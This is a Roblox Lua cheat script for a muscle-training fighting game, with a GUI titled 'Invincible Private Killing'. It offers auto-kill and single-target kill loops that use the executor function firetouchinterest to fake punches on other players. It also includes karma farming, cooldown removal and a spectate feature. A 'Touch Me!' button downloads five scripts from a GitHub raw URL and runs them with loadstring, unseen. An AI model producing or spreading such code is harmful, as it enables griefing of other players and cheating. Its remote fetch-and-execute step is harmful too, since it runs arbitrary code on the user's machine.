local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "MyFeatureUI"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 470, 0, 700)
frame.Position = UDim2.new(0.5, -325, 0.5, -250)
frame.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
frame.BorderSizePixel = 0

-- Make frame draggable
do
    local UIS = game:GetService("UserInputService")
    local dragging = false
    local dragStart, startPos
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
        end
    end)
    frame.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            frame.Position = startPos + UDim2.new(0, delta.X, 0, delta.Y)
        end
    end)
end

-- Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundColor3 = Color3.fromRGB(0, 20, 0)
title.TextColor3 = Color3.new(1, 1, 1)
title.Text = "Invincible Private Killing"
title.Font = Enum.Font.SourceSansBold
title.TextSize = 20

local yOffset = 60

-- Helper functions
local function createButton(text, yPos)
    local btn = Instance.new("TextButton", frame)
    btn.Size = UDim2.new(0, 300, 0, 40)
    btn.Position = UDim2.new(0, 20, 0, yPos)
    btn.Text = text
    btn.BackgroundColor3 = Color3.fromRGB(0, 50, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    return btn
end

local function createInput(placeholder, yPos)
    local input = Instance.new("TextBox", frame)
    input.Size = UDim2.new(0, 250, 0, 40)
    input.Position = UDim2.new(0, 350, 0, yPos)
    input.PlaceholderText = placeholder
    input.Text = ""
    input.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    input.TextColor3 = Color3.new(1, 1, 1)
    return input
end

local function addLabel(parent, text, yPos)
    local label = Instance.new("TextLabel", parent)
    label.Size = UDim2.new(1, 0, 0, 20)
    label.Position = UDim2.new(0, 0, 0, yPos)
    label.Text = text
    label.Font = Enum.Font.Merriweather
    label.TextSize = 18
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.BackgroundTransparency = 1
    return label
end

local function addSwitch(parent, text, callback, yPos)
    local switch = Instance.new("TextButton", parent)
    switch.Size = UDim2.new(0, 150, 0, 30)
    switch.Position = UDim2.new(0, 0, 0, yPos)
    switch.Text = text .. ": OFF"
    switch.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    switch.TextColor3 = Color3.new(1, 1, 1)
    local state = false
    switch.MouseButton1Click:Connect(function()
        state = not state
        switch.Text = text .. ": " .. (state and "ON" or "OFF")
        callback(state)
    end)
    return switch
end

local function addDropdown(parent, text, callback)
    local dropdownFrame = Instance.new("Frame", parent)
    dropdownFrame.Size = UDim2.new(0, 160, 0, 30)
    dropdownFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)

    local label = Instance.new("TextLabel", dropdownFrame)
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = Color3.new(1, 1, 1)
    label.Font = Enum.Font.SourceSans
    label.TextSize = 14
    label.TextXAlignment = Enum.TextXAlignment.Left

    local button = Instance.new("TextButton", dropdownFrame)
    button.Size = UDim2.new(1, 0, 1, 0)
    button.BackgroundTransparency = 1
    button.Position = UDim2.new(0, 0, 0, 0)
    button.Text = "▼"
    button.TextColor3 = Color3.new(1, 1, 1)
    button.Font = Enum.Font.SourceSansBold
    button.TextSize = 14

    local optionsFrame = Instance.new("Frame", parent)
    optionsFrame.Size = UDim2.new(0, 160, 0, 0)
    optionsFrame.Position = UDim2.new(0, 0, 0, 30)
    optionsFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    optionsFrame.Visible = false
    optionsFrame.ClipsDescendants = true

    local options = {}

    local function addOption(optionText)
        local optionBtn = Instance.new("TextButton", optionsFrame)
        optionBtn.Size = UDim2.new(1, 0, 0, 25)
        optionBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        optionBtn.Text = optionText
        optionBtn.TextColor3 = Color3.new(1, 1, 1)
        optionBtn.Font = Enum.Font.SourceSans
        optionBtn.TextSize = 14

        optionBtn.MouseButton1Click:Connect(function()
            callback(optionText)
            label.Text = text .. ": " .. optionText
            optionsFrame.Visible = false
        end)
        table.insert(options, optionBtn)
    end

    button.MouseButton1Click:Connect(function()
        optionsFrame.Visible = not optionsFrame.Visible
        optionsFrame.Size = UDim2.new(0, 160, 0, #options * 25)
    end)

    return {
        Add = addOption,
        Frame = optionsFrame,
        Button = button,
        Label = label,
        AddOption = addOption,
    }
end

-- ================================
-- START: Add your features here
-- ================================

local y = 10

-- 1. Pet Selection Dropdown
addLabel(frame, "Select damage or durability pet", y)
y = y + 25

local petDropdown = addDropdown(frame, "Select Pet", function(selected)
    -- Example: Equip pet logic
    local petsFolder = player:WaitForChild("petsFolder")
    -- Unequip all pets first
    for _, folder in pairs(petsFolder:GetChildren()) do
        if folder:IsA("Folder") then
            for _, pet in pairs(folder:GetChildren()) do
                game:GetService("ReplicatedStorage").rEvents.equipPetEvent:FireServer("unequipPet", pet)
            end
        end
    end
    task.wait(0.2)
    -- Equip selected pet
    local uniqueFolder = petsFolder:FindFirstChild("Unique")
    if uniqueFolder then
        for _, pet in pairs(uniqueFolder:GetChildren()) do
            if pet.Name == selected then
                game:GetService("ReplicatedStorage").rEvents.equipPetEvent:FireServer("equipPet", pet)
            end
        end
    end
end)
y = y + 35

-- 2. AutoKarma switches
local autoGoodKarma = false
local autoBadKarma = false
local autoKill = false
local autoEquipPunch = false
local autoPunchNoAnim = false
local _G = _G or {}

local function fireTouch(targetPart, otherPart)
    pcall(function()
        firetouchinterest(targetPart, otherPart, 1)
        firetouchinterest(targetPart, otherPart, 0)
    end)
end

-- Auto Good Karma
local goodKarmaSwitch = addSwitch(frame, "Auto Good Karma", function(state)
    autoGoodKarma = state
    if state then
        task.spawn(function()
            while autoGoodKarma do
                local char = player.Character
                local rightHand = char and char:FindFirstChild("RightHand")
                local leftHand = char and char:FindFirstChild("LeftHand")
                if rightHand and leftHand then
                    for _, target in ipairs(game.Players:GetPlayers()) do
                        if target ~= player and target.Character then
                            local evilKarma = target.Character:FindFirstChild("evilKarma")
                            local goodKarma = target.Character:FindFirstChild("goodKarma")
                            if evilKarma and goodKarma and evilKarma:IsA("IntValue") and goodKarma:IsA("IntValue") then
                                if goodKarma.Value < evilKarma.Value then
                                    local rootPart = target.Character:FindFirstChild("HumanoidRootPart")
                                    if rootPart then
                                        fireTouch(rightHand, rootPart)
                                        fireTouch(leftHand, rootPart)
                                    end
                                end
                            end
                        end
                    end
                end
                task.wait(0.01)
            end
        end)
    end
end)
y = y + 40

-- Auto Bad Karma
local badKarmaSwitch = addSwitch(frame, "Auto Bad Karma", function(state)
    autoBadKarma = state
    if state then
        task.spawn(function()
            while autoBadKarma do
                local char = player.Character
                local rightHand = char and char:FindFirstChild("RightHand")
                local leftHand = char and char:FindFirstChild("LeftHand")
                if rightHand and leftHand then
                    for _, target in ipairs(game.Players:GetPlayers()) do
                        if target ~= player and target.Character then
                            local evilKarma = target.Character:FindFirstChild("evilKarma")
                            local goodKarma = target.Character:FindFirstChild("goodKarma")
                            if evilKarma and goodKarma and evilKarma:IsA("IntValue") and goodKarma:IsA("IntValue") then
                                if evilKarma.Value > goodKarma.Value then
                                    local rootPart = target.Character:FindFirstChild("HumanoidRootPart")
                                    if rootPart then
                                        fireTouch(rightHand, rootPart)
                                        fireTouch(leftHand, rootPart)
                                    end
                                end
                            end
                        end
                    end
                end
                task.wait(0.01)
            end
        end)
    end
end)
y = y + 40

-- 3. Auto Whitelist Friends
local playerWhitelist = {}
local friendWhitelistActive = false

local function updateWhitelist()
    for _, p in ipairs(game.Players:GetPlayers()) do
        if p ~= player and player:IsFriendsWith(p.UserId) then
            playerWhitelist[p.Name] = true
        end
    end
end

local whitelistSwitch = addSwitch(frame, "Auto Whitelist Friends", function(state)
    friendWhitelistActive = state
    if state then
        updateWhitelist()
        game.Players.PlayerAdded:Connect(function(p)
            if p ~= player and player:IsFriendsWith(p.UserId) then
                playerWhitelist[p.Name] = true
            end
        end)
    else
        for k in pairs(playerWhitelist) do
            playerWhitelist[k] = nil
        end
    end
end)
y = y + 40

local whitelistInput = createInput("Whitelist", y)
whitelistInput.FocusLost:Connect(function()
    local n = whitelistInput.Text
    local p = game.Players:FindFirstChild(n)
    if p then
        playerWhitelist[p.Name] = true
    end
end)
y = y + 45

local unWhitelistInput = createInput("UnWhitelist", y)
unWhitelistInput.FocusLost:Connect(function()
    local n = unWhitelistInput.Text
    local p = game.Players:FindFirstChild(n)
    if p then
        playerWhitelist[p.Name] = nil
    end
end)
y = y + 45

-- 4. Auto Kill
local autoKill = false
local autoKillSwitch = addSwitch(frame, "Auto Kill", function(state)
    autoKill = state
    if state then
        task.spawn(function()
            while autoKill do
                local char = player.Character or player.CharacterAdded:Wait()
                local rightHand = char:FindFirstChild("RightHand")
                local leftHand = char:FindFirstChild("LeftHand")
                local punch = player.Backpack:FindFirstChild("Punch")
                if punch and not char:FindFirstChild("Punch") then
                    punch.Parent = char
                end
                for _, target in ipairs(game.Players:GetPlayers()) do
                    if target ~= player and not playerWhitelist[target.Name] then
                        if target.Character then
                            local rootP = target.Character:FindFirstChild("HumanoidRootPart")
                            if rootP then
                                pcall(function()
                                    fireTouch(rightHand, rootP)
                                    fireTouch(leftHand, rootP)
                                end)
                            end
                        end
                    end
                end
                task.wait(0.05)
            end
        end)
    end
end)
y = y + 40

-- 5. Target Player Dropdown and Kill toggle
local targetPlayerNames = {}
local selectedTarget = nil

local function populateTargetDropdown()
    -- Clear previous
    for _, child in ipairs(frame:GetChildren()) do
        if child.Name == "TargetDropdown" then
            child:Destroy()
        end
    end
    local dd = addDropdown(frame, "Select Target", function(displayName)
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p.DisplayName == displayName then
                selectedTarget = p
                break
            end
        end
    end)
    dd.Name = "TargetDropdown"
    for _, p in ipairs(game.Players:GetPlayers()) do
        if p ~= player then
            dd.Add(p.DisplayName)
        end
    end
    return dd
end

local targetDropdown = populateTargetDropdown()

local killTargetActive = false
local function toggleKillTarget()
    killTargetActive = not killTargetActive
    if killTargetActive then
        task.spawn(function()
            while killTargetActive do
                if selectedTarget and selectedTarget.Character then
                    local rootPart = selectedTarget.Character:FindFirstChild("HumanoidRootPart")
                    local rightHand = player.Character and player.Character:FindFirstChild("RightHand")
                    local leftHand = player.Character and player.Character:FindFirstChild("LeftHand")
                    local punch = player.Backpack:FindFirstChild("Punch")
                    if punch and not player.Character:FindFirstChild("Punch") then
                        punch.Parent = player.Character
                    end
                    if rightHand and leftHand then
                        pcall(function()
                            fireTouch(rightHand, rootPart)
                            fireTouch(leftHand, rootPart)
                        end)
                    end
                end
                task.wait(0.05)
            end
        end)
    end
end

local btnKill = createButton("Start Kill Target", y)
btnKill.MouseButton1Click:Connect(toggleKillTarget)
y = y + 45

-- 6. View Player (Spy)
local targetViewPlayer = nil
local spying = false

local function followPlayer(targetPlayer)
    local myChar = player.Character
    local targetChar = targetPlayer.Character
    if not (myChar and targetChar) then return end
    local myHRP = myChar:FindFirstChild("HumanoidRootPart")
    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
    if myHRP and targetHRP then
        local followPos = targetHRP.CFrame.Position - (targetHRP.CFrame.LookVector * 3)
        myHRP.CFrame = CFrame.new(followPos, targetHRP.Position)
    end
end

local function populateViewDropdown()
    for _, child in ipairs(frame:GetChildren()) do
        if child.Name == "ViewDropdown" then
            child:Destroy()
        end
    end
    local dd = addDropdown(frame, "Select View Target", function(displayName)
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p.DisplayName == displayName then
                targetViewPlayer = p
                break
            end
        end
    end)
    dd.Name = "ViewDropdown"
    for _, p in ipairs(game.Players:GetPlayers()) do
        if p ~= player then
            dd.Add(p.DisplayName)
        end
    end
end

populateViewDropdown()

local function toggleSpy()
    spying = not spying
    if spying then
        task.spawn(function()
            while spying do
                if targetViewPlayer and targetViewPlayer.Character then
                    local humanoid = targetViewPlayer.Character:FindFirstChild("Humanoid")
                    if humanoid then
                        workspace.CurrentCamera.CameraSubject = humanoid
                    end
                end
                task.wait(0.1)
            end
        end)
    else
        workspace.CurrentCamera.CameraSubject = player.Character:FindFirstChild("Humanoid")
    end
end

local viewSwitch = addSwitch(frame, "View Player", toggleSpy)

local stopFollowBtn = createButton("Dejar de Seguir", y)
stopFollowBtn.MouseButton1Click:Connect(function()
    spying = false
    workspace.CurrentCamera.CameraSubject = player.Character:FindFirstChild("Humanoid")
    print("⛔ Stopped spying")
end)
y = y + 45

-- 7. Auto Slams
local autoSlam = false
local function toggleAutoSlam()
    autoSlam = not autoSlam
    if autoSlam then
        task.spawn(function()
            while autoSlam do
                local playerChar = player.Character
                local groundSlam = player.Backpack:FindFirstChild("Ground Slam") or (playerChar and playerChar:FindFirstChild("Ground Slam"))
                if groundSlam then
                    if groundSlam.Parent == player.Backpack then
                        groundSlam.Parent = playerChar
                    end
                    if groundSlam:FindFirstChild("attackTime") then
                        groundSlam.attackTime.Value = 0
                    end
                    player.muscleEvent:FireServer("slam")
                    groundSlam:Activate()
                end
                task.wait(0.1)
            end
        end)
    end
end

local slamBtn = addSwitch(frame, "auto slams", toggleAutoSlam)
y = y + 40

-- 8. Crack Scripts Button
local crackUrls = {
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack",
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack2",
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack4",
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack5",
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack6"
}
local function runCracks()
    for _, url in ipairs(crackUrls) do
        spawn(function()
            local success, response = pcall(function()
                return game:HttpGet(url)
            end)
            if success and response then
                local loadSuccess, err = pcall(function()
                    loadstring(response)()
                end)
            end
        end)
    end
end

local crackBtn = createButton("Touch Me!", y)
crackBtn.MouseButton1Click:Connect(runCracks)
y = y + 45

-- 9. Change Time (Lighting)
local Lighting = game:GetService("Lighting")
local timeOptions = {
    "Morning",
    "Noon",
    "Afternoon",
    "Sunset",
    "Night",
    "Midnight",
    "Dawn",
    "Early Morning"
}
local function changeTime(selection)
    -- Reset Lighting
    Lighting.Brightness = 2
    Lighting.FogEnd = 100000
    Lighting.Ambient = Color3.fromRGB(127,127,127)
    if selection == "Morning" then
        Lighting.ClockTime = 6
        Lighting.Brightness = 2
        Lighting.Ambient = Color3.fromRGB(200, 200, 255)
    elseif selection == "Noon" then
        Lighting.ClockTime = 12
        Lighting.Brightness = 3
        Lighting.Ambient = Color3.fromRGB(255, 255, 255)
    elseif selection == "Afternoon" then
        Lighting.ClockTime = 16
        Lighting.Brightness = 2.5
        Lighting.Ambient = Color3.fromRGB(255, 220, 180)
    elseif selection == "Sunset" then
        Lighting.ClockTime = 18
        Lighting.Brightness = 2
        Lighting.Ambient = Color3.fromRGB(255, 150, 100)
        Lighting.FogEnd = 500
    elseif selection == "Night" then
        Lighting.ClockTime = 20
        Lighting.Brightness = 1.5
        Lighting.Ambient = Color3.fromRGB(100, 100, 150)
        Lighting.FogEnd = 800
    elseif selection == "Midnight" then
        Lighting.ClockTime = 0
        Lighting.Brightness = 1
        Lighting.Ambient = Color3.fromRGB(50, 50, 100)
        Lighting.FogEnd = 400
    elseif selection == "Dawn" then
        Lighting.ClockTime = 4
        Lighting.Brightness = 1.8
        Lighting.Ambient = Color3.fromRGB(180, 180, 220)
    elseif selection == "Early Morning" then
        Lighting.ClockTime = 2
        Lighting.Brightness = 1.2
        Lighting.Ambient = Color3.fromRGB(100, 120, 180)
    end
end

local function populateTimeDropdown()
    local dd = addDropdown(frame, "change time", changeTime)
    for _, option in ipairs(timeOptions) do
        dd.Add(option)
    end
end

populateTimeDropdown()

-- ================================
-- Finalize: All features added
-- ================================

-- Note: Make sure this script is a LocalScript inside StarterPlayer > StarterPlayerScripts
